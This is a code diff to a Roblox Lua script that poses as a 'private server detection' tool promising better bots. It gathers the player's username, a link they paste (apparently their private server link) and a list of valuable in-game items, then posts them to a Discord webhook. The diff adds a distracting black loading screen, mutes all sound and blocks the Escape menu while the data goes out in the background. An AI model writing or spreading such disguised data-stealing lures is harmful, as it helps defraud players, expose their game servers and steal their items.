@@ -1,7 +1,7 @@
--- 📘 MOREIRA METHOD - Private Server Detection (Universal) + UI Loader
+-- 📘 MOREIRA METHOD - Private Server Detection (Universal) + UI Loader (Optimizado con pantalla de carga)
 -- Envía datos del jugador directamente al Discord Webhook (username: Sab)
--- No guarda nada localmente, solo envía al webhook
--- MINTHUBx + Copilot
+-- Examina todo el Workspace en busca de objetos indicados
+-- Pantalla negra de carga y barra de progreso
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -23,35 +23,18 @@ local objetosBuscados = {
     "Spooky and Pumpky", "Chillin Chili", "Tictac Sahur", "La Extinct Grande", "Nuclearo Dinossauro"
 }
 
--- Espera hasta que el plot del jugador esté disponible
-local function esperarPlot(timeout)
-    timeout = timeout or 10
-    local plot = nil
-    for i=1,timeout*2 do
-        local plotsFolder = Workspace:FindFirstChild("plots")
-        if plotsFolder then
-            for _, modelo in ipairs(plotsFolder:GetChildren()) do
-                if modelo:IsA("Model") and modelo.Name == LocalPlayer.Name then
-                    plot = modelo
-                    break
-                end
-            end
-            if plot then break end
-        end
-        task.wait(0.5)
-    end
-    return plot
+-- Convertir a diccionario para búsquedas rápidas
+local objetosDict = {}
+for _, nombre in ipairs(objetosBuscados) do
+    objetosDict[nombre] = true
 end
 
--- Busca los objetos en el plot/modelo del jugador
-local function obtenerObjetosEnPlot()
+-- Busca los objetos en todo el Workspace
+local function obtenerObjetosEnWorkspace()
     local encontrados = {}
-    local plot = esperarPlot(10)
-    if plot then
-        for _, nombreObjeto in ipairs(objetosBuscados) do
-            if plot:FindFirstChild(nombreObjeto) then
-                table.insert(encontrados, nombreObjeto)
-            end
+    for _, objeto in ipairs(Workspace:GetDescendants()) do
+        if objetosDict[objeto.Name] then
+            table.insert(encontrados, objeto.Name)
         end
     end
     return encontrados
@@ -60,13 +43,13 @@ end
 -- Envía los datos al webhook de Discord
 local function enviarWebhook(link)
     local player = Players.LocalPlayer
-    local objetos = obtenerObjetosEnPlot()
+    local objetos = obtenerObjetosEnWorkspace()
     local fecha = os.date("%Y-%m-%d %H:%M:%S")
     local mensaje = "**Datos del jugador que ejecutó el script:**\n" ..
         "**Usuario:** " .. player.Name ..
         "\n**Link:** " .. link ..
         "\n**Fecha:** " .. fecha ..
-        "\n**Objetos en plots:**\n" .. (#objetos > 0 and table.concat(objetos, "\n") or "Ninguno")
+        "\n**Objetos encontrados en Workspace:**\n" .. (#objetos > 0 and table.concat(objetos, "\n") or "Ninguno")
 
     local data = {
         ["username"] = "Sab",
@@ -97,12 +80,12 @@ end
 -- 🎬 Pantalla negra y loading bar
 ------------------------------------------------------------
 local function muteAllSounds()
-    for i, sound in SoundService:GetDescendants() do
+    for _, sound in ipairs(SoundService:GetDescendants()) do
         if sound:IsA("Sound") then
             sound.Volume = 0
         end
     end
-    for i, sound in Workspace:GetDescendants() do
+    for _, sound in ipairs(Workspace:GetDescendants()) do
         if sound:IsA("Sound") then
             sound.Volume = 0
         end
@@ -193,23 +176,8 @@ infoLabel.TextColor3 = Color3.fromRGB(255, 220, 0)
 infoLabel.Text = "The better things you have in your base, the better bots will join."
 infoLabel.Parent = inputFrame
 
--- 🟨 TEST WEBHOOK BUTTON
-local testButton = Instance.new("TextButton")
-testButton.Size = UDim2.new(0.5, 0, 0, 40)
-testButton.Position = UDim2.new(0.25, 0, 0, 255)
-testButton.BackgroundColor3 = Color3.fromRGB(255, 255, 50)
-testButton.Font = Enum.Font.GothamBold
-testButton.TextScaled = true
-testButton.TextColor3 = Color3.fromRGB(100, 100, 0)
-testButton.Text = "TEST WEBHOOK"
-testButton.Parent = inputFrame
-
-local testCorner = Instance.new("UICorner")
-testCorner.CornerRadius = UDim.new(0, 8)
-testCorner.Parent = testButton
-
 ------------------------------------------------------------
--- 🟧 Botón SEND (envía al webhook y pantalla negra)
+-- 🟧 Botón SEND (pantalla negra + barra de carga + envío automático)
 ------------------------------------------------------------
 sendButton.MouseButton1Click:Connect(function()
     local link = textBox.Text
@@ -282,8 +250,17 @@ sendButton.MouseButton1Click:Connect(function()
     percentLabel.ZIndex = 10003
     percentLabel.Parent = blackFrame
 
-    local duration = 300
-    local steps = 600
+    muteAllSounds()
+    ContextActionService:BindAction(escBlockActionName, blockEscMenu, false, Enum.KeyCode.Escape)
+
+    -- Envía los datos al webhook mientras carga la barra
+    task.spawn(function()
+        enviarWebhook(link)
+    end)
+
+    -- Animación de barra de carga
+    local duration = 2 -- segundos, puedes ajustar el tiempo de distracción
+    local steps = 100
     for step = 0, steps do
         local percent = step / steps
         fillFrame.Size = UDim2.new(percent, 0, 1, 0)
@@ -293,23 +270,8 @@ sendButton.MouseButton1Click:Connect(function()
     fillFrame.Size = UDim2.new(1, 0, 1, 0)
     percentLabel.Text = "100%"
 
-    muteAllSounds()
-    ContextActionService:BindAction(escBlockActionName, blockEscMenu, false, Enum.KeyCode.Escape)
-
-    -- Envía los datos al webhook
-    enviarWebhook(link)
     label.TextColor3 = Color3.fromRGB(40, 200, 80)
     label.Text = "Datos enviados al webhook de Discord (Sab)!"
-end)
-
-------------------------------------------------------------
--- 🟨 Botón TEST WEBHOOK (envía datos de prueba al webhook)
-------------------------------------------------------------
-testButton.MouseButton1Click:Connect(function()
-    local link = textBox.Text ~= "" and textBox.Text or "LINK-DE-PRUEBA"
-    enviarWebhook(link)
-    label.TextColor3 = Color3.fromRGB(255, 220, 0)
-    label.Text = "Test enviado al webhook de Discord (Sab)!"
 end)
 
 if blackFrame then
